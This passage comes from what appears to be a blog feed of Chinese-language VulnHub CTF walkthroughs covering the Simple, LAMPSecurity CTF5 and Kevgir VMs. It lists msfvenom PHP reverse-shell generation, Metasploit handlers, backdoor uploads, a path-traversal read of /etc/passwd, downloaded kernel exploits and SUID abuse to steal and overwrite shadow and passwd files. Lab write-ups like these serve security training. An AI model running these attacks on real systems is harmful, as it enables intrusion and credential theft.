class="line">searchsploit cutenews 2.0.3</span><br></pre></td></tr></table></figure><p>![image-20220610090452881](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610090452881.png)</p><blockquote><p>在搜索漏洞利用后，我们可以看到我们有漏洞利用的路径。按照路径并转到漏洞利用的“.txt”文件。在文本文件中，您可以找到<strong>上传</strong>文件的说明。它告诉我们的第一件事是在网站上注册以便有权上传文件</p></blockquote><p>![image-20220610090749820](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610090749820.png)</p><blockquote><p>注册它会要求您提供您的用户名和密码</p></blockquote><p>![image-20220610091102958](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610091102958.png)</p><blockquote><p>注册成功之后为上述页面</p></blockquote><h3 id="2-3生成-PHP-后门-Msfvenom"><a href="#2-3生成-PHP-后门-Msfvenom" class="headerlink" title="2.3生成 PHP 后门 (Msfvenom)"></a>2.3生成 PHP 后门 (Msfvenom)</h3><blockquote><p>使用metasploit 进行反弹shell脚本生成（一句话木马）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.128 lport=4444 -f raw</span><br></pre></td></tr></table></figure><p>![image-20220610091532111](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610091532111.png)</p><h3 id="2-4上传并执行后门"><a href="#2-4上传并执行后门" class="headerlink" title="2.4上传并执行后门"></a>2.4上传并执行后门</h3><blockquote><p><strong>将</strong>代码从**&lt;?php 复制到 die()<strong>并将其保存在扩展名为 .php 的文件中。要从您刚刚注册的用户名上传文件登录，然后单击 <strong>个人选项</strong> ，提供您的 <strong>用户名</strong> 和</strong>邮件 ID** ，然后浏览您要上传的文件，然后单击 <strong>保存</strong>。</p></blockquote><p>![image-20220610092105401](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610092105401.png)</p><p>![image-20220610092209049](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610092209049.png)</p><h3 id="2-5dirb进行目录爆破，确定上传位置"><a href="#2-5dirb进行目录爆破，确定上传位置" class="headerlink" title="2.5dirb进行目录爆破，确定上传位置"></a>2.5dirb进行目录爆破，确定上传位置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.239</span><br></pre></td></tr></table></figure><p>![image-20220610092552001](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610092552001.png)</p><blockquote><p>确定上传位置为：  &#x2F;uploads</p></blockquote><p>![image-20220610092715637](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610092715637.png)</p><h3 id="2-5反向连接（Metasploit）"><a href="#2-5反向连接（Metasploit）" class="headerlink" title="2.5反向连接（Metasploit）"></a>2.5反向连接（Metasploit）</h3><blockquote><p>打开metasploit的控制台</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p>![image-20220610092949636](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610092949636.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) set lhost 192.168.1.108</span><br><span class="line">msf exploit(multi/handler) set lport 4444</span><br><span class="line">msf exploit(multi/handler) exploit</span><br></pre></td></tr></table></figure><p>![image-20220610093206087](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610093206087.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p>![image-20220610093232693](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610093232693.png)</p><h3 id="2-6为shell-导入-python-bash"><a href="#2-6为shell-导入-python-bash" class="headerlink" title="2.6为shell 导入 python bash"></a>2.6为shell 导入 python bash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>![image-20220610093322073](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610093322073.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br></pre></td></tr></table></figure><p>![image-20220610093407414](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610093407414.png)</p><h3 id="2-7内核权限提升"><a href="#2-7内核权限提升" class="headerlink" title="2.7内核权限提升"></a>2.7内核权限提升</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>![image-20220610093537718](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610093537718.png)</p><blockquote><p>使用 <strong>uname  -a</strong> 命令，我找到了可以帮助我找到用于提权的内核漏洞利用的机器架构，并且在 Google 搜索的帮助下，我们得到了<strong>漏洞利用 36746</strong></p></blockquote><blockquote><p>下载exploit进行内核提权</p></blockquote><p>![image-20220610093859062](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610093859062.png)</p><blockquote><p>直接下载</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/36746</span><br></pre></td></tr></table></figure><p>![image-20220610094043818](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610094043818.png)</p><blockquote><p>gcc进行编译</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mv 36746 36746.c</span><br><span class="line">gcc 36746.c -o access -static</span><br><span class="line">./access</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure><p>![image-20220610094844229](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610094844229.png)</p><h3 id="2-8获取-Root-访问权限并捕获标志"><a href="#2-8获取-Root-访问权限并捕获标志" class="headerlink" title="2.8获取 Root 访问权限并捕获标志"></a>2.8获取 Root 访问权限并捕获标志</h3><p>![image-20220610095050068](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610095050068-16548258508971.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p>![image-20220610095112589](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610095112589.png)</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.破解 LAMPSecurity：CTF 5（CTF 挑战）</title>
      <link href="/2022/06/19/2.%E7%A0%B4%E8%A7%A3%20LAMPSecurity%EF%BC%9ACTF%205%EF%BC%88CTF%20%E6%8C%91%E6%88%98%EF%BC%89/"/>
      <url>/2022/06/19/2.%E7%A0%B4%E8%A7%A3%20LAMPSecurity%EF%BC%9ACTF%205%EF%BC%88CTF%20%E6%8C%91%E6%88%98%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="破解-LAMPSecurity：CTF-5（CTF-挑战）"><a href="#破解-LAMPSecurity：CTF-5（CTF-挑战）" class="headerlink" title="破解 LAMPSecurity：CTF 5（CTF 挑战）"></a>破解 LAMPSecurity：CTF 5（CTF 挑战）</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/lampsecurity-ctf5,84/">https://www.vulnhub.com/entry/lampsecurity-ctf5,84/</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>网络扫描（Nmap、netdiscover）</li><li>HTTP服务枚举</li><li>识别易受攻击的 CMS Web 应用程序的利用</li><li>访问 CMS 管理员登录页面和凭据</li><li>生成 PHP 后门 (Msfvenom)</li><li>上传并执行后门</li><li>反向连接（Metasploit）</li><li>为正确的 TTY shell 导入 python one-liner</li><li>利用目标（利用 9479）</li><li>获取 Root 权限</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1-开始扫描网络以找到我们的目标"><a href="#2-1-开始扫描网络以找到我们的目标" class="headerlink" title="2.1 开始扫描网络以找到我们的目标"></a>2.1 开始扫描网络以找到我们的目标</h3><p>![image-20220604153558426](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604153558426.png)</p><p>找到目标-&gt;192.168.1.8</p><h3 id="2-2-使用NMAP-扫描目标主机"><a href="#2-2-使用NMAP-扫描目标主机" class="headerlink" title="2.2 使用NMAP 扫描目标主机"></a>2.2 使用NMAP 扫描目标主机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- 192.168.1.8</span><br></pre></td></tr></table></figure><p>![image-20220604154306494](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604154306494.png)</p><p>![image-20220604154412399](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604154412399.png)</p><h3 id="2-3-浏览器访问-http-服务"><a href="#2-3-浏览器访问-http-服务" class="headerlink" title="2.3 浏览器访问 http 服务"></a>2.3 浏览器访问 http 服务</h3><p>![image-20220604154544456](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604154544456.png)</p><h3 id="2-4-使用Nikto工具了解更多信息"><a href="#2-4-使用Nikto工具了解更多信息" class="headerlink" title="2.4 使用Nikto工具了解更多信息"></a>2.4 使用Nikto工具了解更多信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h 192.168.1.8</span><br></pre></td></tr></table></figure><p>![image-20220604155828565](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604155828565.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8/index.php?page=../../../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure><p>![image-20220604160003815](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604160003815.png)</p><p>已经成功地在浏览器中收到了 &#x2F;etc&#x2F;passwd 的输出</p><h3 id="2-5-单击网站的博客选项卡"><a href="#2-5-单击网站的博客选项卡" class="headerlink" title="2.5 单击网站的博客选项卡"></a>2.5 单击网站的博客选项卡</h3><p>![image-20220604171000269](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604171000269.png)</p><p>我们从 Andy Carp 的博客中得知该网站由 NanoCMS 提供支持。NanoCMS 是基于 PHP 的轻量级 CMS，现已停产。因此，我们在互联网上搜索了与 Nano CMS 相关的可能漏洞</p><p>识别出的可能漏洞是密码哈希信息泄露，它允许不受限制地访问路径**&#x2F;data&#x2F;pagesdata.txt**</p><p>![image-20220604171616689](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604171616689.png)</p><h3 id="2-6-将密码的MD5解密（使用在线解密网站既可）"><a href="#2-6-将密码的MD5解密（使用在线解密网站既可）" class="headerlink" title="2.6 将密码的MD5解密（使用在线解密网站既可）"></a>2.6 将密码的MD5解密（使用在线解密网站既可）</h3><p>![image-20220604171946552](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604171946552.png)</p><h3 id="2-7-使用账户密码进行登录"><a href="#2-7-使用账户密码进行登录" class="headerlink" title="2.7 使用账户密码进行登录"></a>2.7 使用账户密码进行登录</h3><p>![image-20220604172204162](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604172204162.png)</p><p>发现使用账户名密码之后url会被重定向</p><p>![image-20220604172342801](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604172342801.png)</p><p>登录成功</p><h3 id="2-8-单击新页面选项选项卡，我们应该能够在其中使用我们自己的-PHP-代码添加新内容。"><a href="#2-8-单击新页面选项选项卡，我们应该能够在其中使用我们自己的-PHP-代码添加新内容。" class="headerlink" title="2.8 单击新页面选项选项卡，我们应该能够在其中使用我们自己的 PHP 代码添加新内容。"></a>2.8 单击<strong>新页面</strong>选项选项卡，我们应该能够在其中使用我们自己的 PHP 代码添加新内容。</h3><p>![image-20220604172513029](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604172513029.png)</p><h3 id="2-9-使用msf命令生成一个反向-PHP-shell"><a href="#2-9-使用msf命令生成一个反向-PHP-shell" class="headerlink" title="2.9 使用msf命令生成一个反向 PHP shell"></a>2.9 使用msf命令生成一个反向 PHP shell</h3><p>![image-20220604173138915](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604173138915.png)</p><p>将代码从&lt;?php<strong>复制****到 die() 。</strong>打开网站的 NanoCMS Admin 面板，导航到 New Page 选项并将反向 PHP shell 粘贴到 Content 部分。在标题中输入任何名称，然后单击添加页面</p><h3 id="2-10-打开-Metasploit-控制台并执行以下操作"><a href="#2-10-打开-Metasploit-控制台并执行以下操作" class="headerlink" title="2.10 打开 Metasploit 控制台并执行以下操作"></a>2.10 打开 Metasploit 控制台并执行以下操作</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp </span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.1.134 </span><br><span class="line">msf exploit(handler) &gt; set lport 4444 </span><br><span class="line">msf exploit(handler) &gt; run</span><br></pre></td></tr></table></figure><p>![image-20220604173748367](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604173748367.png)</p><p>一旦我们在 Kali Linux 上启动了监听器，点击 Andy Carp 博客中的<strong>shell</strong>文件。只要我们点击相同的，我们就会得到一个meterpreter控制台。从下图中我们可以观察到Meterpreter session 1。但是我们的任务还没有完成，我们还需要进一步深入进行提权。</p><p>![image-20220604175004654](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604175004654.png)</p><h3 id="2-11-使用sysinfo命令，我们找到了机器架构细节"><a href="#2-11-使用sysinfo命令，我们找到了机器架构细节" class="headerlink" title="2.11 使用sysinfo命令，我们找到了机器架构细节"></a>2.11 使用<strong>sysinfo</strong>命令，我们找到了机器架构细节</h3><blockquote><p>帮助我们找出用于提权的内核漏洞</p></blockquote><p>![image-20220604175153752](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604175153752.png)</p><h3 id="2-12-使用exploit进行提权"><a href="#2-12-使用exploit进行提权" class="headerlink" title="2.12 使用exploit进行提权"></a>2.12 使用exploit进行提权</h3><blockquote><p><a href="https://www.exploit-db.com/exploits/9479">https://www.exploit-db.com/exploits/9479</a></p></blockquote><p>由于我们知道该版本的内核存在漏洞，我们将从 Exploit DB 网站将其漏洞利用程序下载到 Kali 机器上，如下图所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/9479.c</span><br></pre></td></tr></table></figure><p>编译c文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -o exploit 9479.c</span><br></pre></td></tr></table></figure><p>![image-20220604182616415](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220604182616415.png)</p><p>继续前进并通过键入以下内容转到 tmp 文件夹：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br></pre></td></tr></table></figure><p>让我们看看它有哪些目录以及该类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p>在执行之前为漏洞分配权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 exploit</span><br></pre></td></tr></table></figure><p>然后键入以下命令来执行漏洞利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env- ./exploit</span><br></pre></td></tr></table></figure><p>![image-20220605094310201](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220605094310201.png)</p><p>![image-20220605095108172](2.破解 LAMPSecurity：CTF 5（CTF 挑战）.assets&#x2F;image-20220605095108172.png)</p><h3 id="2-13-成功获取题解，successful"><a href="#2-13-成功获取题解，successful" class="headerlink" title="2.13 成功获取题解，successful"></a>2.13 成功获取题解，successful</h3>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20.Hack the Kevgir VM (CTF Challenge)</title>
      <link href="/2022/06/19/20.Hack%20the%20Kevgir%20VM%20(CTF%20Challenge)/"/>
      <url>/2022/06/19/20.Hack%20the%20Kevgir%20VM%20(CTF%20Challenge)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-Kevgir-VM-CTF-Challenge"><a href="#Hack-the-Kevgir-VM-CTF-Challenge" class="headerlink" title="Hack the Kevgir VM (CTF Challenge)"></a>Hack the Kevgir VM (CTF Challenge)</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/kevgir-1,137/">https://www.vulnhub.com/entry/kevgir-1,137/</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>网络扫描（Nmap、netdiscover）</li><li>基于 Joomla 的 CMS 扫描 CMS (Joomscan)</li><li>利用目标（利用 6234）</li><li>登录到管理控制台</li><li>生成 PHP 后门 (Msfvenom)</li><li>上传并执行后门</li><li>反向连接（Metasploit）</li><li>为shell 导入 python bash</li><li>查找用于权限提升的 SUID 二进制文件</li><li>获得shadow &amp; password 文件</li><li>获取 Root 访问权限并捕获标志</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1网络扫描（Nmap、netdiscover）"><a href="#2-1网络扫描（Nmap、netdiscover）" class="headerlink" title="2.1网络扫描（Nmap、netdiscover）"></a>2.1网络扫描（Nmap、netdiscover）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>![image-20220610102241281](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610102241281.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A 192.168.1.238 </span><br></pre></td></tr></table></figure><p>![image-20220610102712124](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610102712124.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV 192.168.1.238</span><br></pre></td></tr></table></figure><p>![image-20220610102847414](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610102847414.png)</p><blockquote><p>可以看到这里使用了端口转发，例如 HTTP 服务在端口号 80、8080 和 8081 上打开。所以，让我们尝试在 80 和 8081 端口上打开我们的目标</p></blockquote><blockquote><p>80端口</p></blockquote><p>![image-20220610103151315](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610103151315.png)</p><blockquote><p>8080端口</p></blockquote><p>![image-20220610103233809](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610103233809.png)</p><blockquote><p>8081端口</p></blockquote><p>![image-20220610103305790](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610103305790.png)</p><h3 id="2-2基于-Joomla-的-CMS-扫描-CMS-Joomscan"><a href="#2-2基于-Joomla-的-CMS-扫描-CMS-Joomscan" class="headerlink" title="2.2基于 Joomla 的 CMS 扫描 CMS (Joomscan)"></a>2.2基于 Joomla 的 CMS 扫描 CMS (Joomscan)</h3><blockquote><ol><li>在8081端口上的网站时joomla</li><li>网站的 cms 是 Joomla，众所周知，这个版本的 Joomla 是可利用的。我们将使用 joomscan 扫描上述目标</li></ol></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://192.168.1.238:8081</span><br></pre></td></tr></table></figure><blockquote><p>这个版本的joomla的漏洞太多</p></blockquote><p>![image-20220610103855574](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610103855574.png)</p><blockquote><p>使用 joomscan 将显示所有易受攻击的漏洞。在这里，我们可以观察到指向“Admin Password changed”的突出显示文本似乎容易受到exploit 6234 的攻击。现在，如果您仔细观察，利用编号 6234 将向您展示利用特定漏洞的步骤</p></blockquote><h3 id="2-3利用目标（exploit-6234）"><a href="#2-3利用目标（exploit-6234）" class="headerlink" title="2.3利用目标（exploit 6234）"></a>2.3利用目标（exploit 6234）</h3><blockquote><p>使用exploit-db数据库查找漏洞利用</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/exploits/6234</span><br></pre></td></tr></table></figure><p>![image-20220610104428732](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610104428732.png)</p><blockquote><p>利用步骤</p></blockquote><p>![image-20220610104538718](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610104538718.png)</p><p>![image-20220610104629615](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610104629615.png)</p><p>![image-20220610104743014](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610104743014.png)</p><p>![image-20220610104829870](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610104829870.png)</p><h3 id="2-4登录到管理控制台"><a href="#2-4登录到管理控制台" class="headerlink" title="2.4登录到管理控制台"></a>2.4登录到管理控制台</h3><p>![image-20220610105200253](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610105200253.png)</p><p>![image-20220610105238838](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610105238838.png)</p><p>![image-20220610105516151](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610105516151.png)</p><blockquote><p>选择 <strong>Extensions</strong> &gt; <strong>Template Manager</strong> &gt; <strong>rhuk_milkway</strong> &gt; <strong>Edit HTML</strong></p></blockquote><p>![image-20220610105846255](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610105846255.png)</p><h3 id="2-5生成-PHP-后门-Msfvenom"><a href="#2-5生成-PHP-后门-Msfvenom" class="headerlink" title="2.5生成 PHP 后门 (Msfvenom)"></a>2.5生成 PHP 后门 (Msfvenom)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.128 lport=4444 -f raw</span><br></pre></td></tr></table></figure><p>![image-20220610110017046](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610110017046.png)</p><h3 id="2-6上传并执行后门"><a href="#2-6上传并执行后门" class="headerlink" title="2.6上传并执行后门"></a>2.6上传并执行后门</h3><p>![image-20220610110147254](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220610110147254.png)</p><h3 id="2-7反向连接（Metasploit）"><a href="#2-7反向连接（Metasploit）" class="headerlink" title="2.7反向连接（Metasploit）"></a>2.7反向连接（Metasploit）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) set lhost 192.168.1.108</span><br><span class="line">msf exploit(multi/handler) set lport 4444</span><br><span class="line">msf exploit(multi/handler) exploit</span><br></pre></td></tr></table></figure><p>![image-20220611102206499](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220611102206499.png)</p><h3 id="2-8为shell-导入-python-bash"><a href="#2-8为shell-导入-python-bash" class="headerlink" title="2.8为shell 导入 python bash"></a>2.8为shell 导入 python bash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>![image-20220611102306091](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220611102306091.png)</p><h3 id="2-9find命令寻找权限提升的-SUID-二进制文件"><a href="#2-9find命令寻找权限提升的-SUID-二进制文件" class="headerlink" title="2.9find命令寻找权限提升的 SUID 二进制文件"></a>2.9find命令寻找权限提升的 SUID 二进制文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>![image-20220611102644241](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220611102644241.png)</p><blockquote><p>因此，我们可以清楚地观察到 cp 为复制命令设置了 SUID 位，以复制任何需要更高权限才能对其执行读&#x2F;写操作的文件，例如 etc&#x2F;passwd 和 etc&#x2F;shadow 文件。</p></blockquote><p>![image-20220611102852898](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220611102852898.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/shadow</span><br></pre></td></tr></table></figure><p>![image-20220611102953103](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220611102953103.png)</p><h3 id="2-10获得shadow-amp-password-文件"><a href="#2-10获得shadow-amp-password-文件" class="headerlink" title="2.10获得shadow &amp; password 文件"></a>2.10获得shadow &amp; password 文件</h3><blockquote><p>现在我们将上面复制的文本粘贴到一个空文档中，并使用开膛手约翰破解这个哈希值。结果，您可以观察到用户的密码：<strong>admin</strong>：<strong>admin</strong>。这种方法被称为 SUID 二进制文件提权。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john shadow</span><br></pre></td></tr></table></figure><p>![image-20220611103716701](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220611103716701.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin            (admin)     </span><br><span class="line">resu             (user)  </span><br></pre></td></tr></table></figure><blockquote><p>使用账户名和密码进行登录，很可惜不能直接破解出root的密码</p></blockquote><blockquote><p>任务还没有完成，这次启动到 root 挑战，我们仍然缺乏 root 权限。现在在 cat 的帮助下打开密码文件，您将在其中找到管理员条目。现在我们知道了管理员用户的密码，并且通过操作他的条目，我们可以增加他的权限并<strong>复制</strong>这个文件的全部内容。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p>![image-20220611104030638](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220611104030638.png)</p><p>![image-20220611105022782](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220611105022782.png)</p><p>![image-20220611105456944](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220611105456944.png)</p><blockquote><p>覆盖原有passwd</p></blockquote><p>![image-20220611105602408](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220611105602408.png)</p><h3 id="2-11获取-Root-访问权限并捕获标志"><a href="#2-11获取-Root-访问权限并捕获标志" class="headerlink" title="2.11获取 Root 访问权限并捕获标志"></a>2.11获取 Root 访问权限并捕获标志</h3><p>![image-20220611105716957](20.Hack the Kevgir VM (CTF Challenge).assets&#x2F;image-20220611105716957.png)</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>21.Hack the Milnet VM (CTF Challenge)</title>
      <link href="/2022/06/19/21.Hack%20the%20Milnet%20VM%20(CTF%20Challenge)/"/>
      <url>/2022/06/19/21.Hack%20the%20Milnet%20VM%20(CTF%20Challenge)/</url>
      
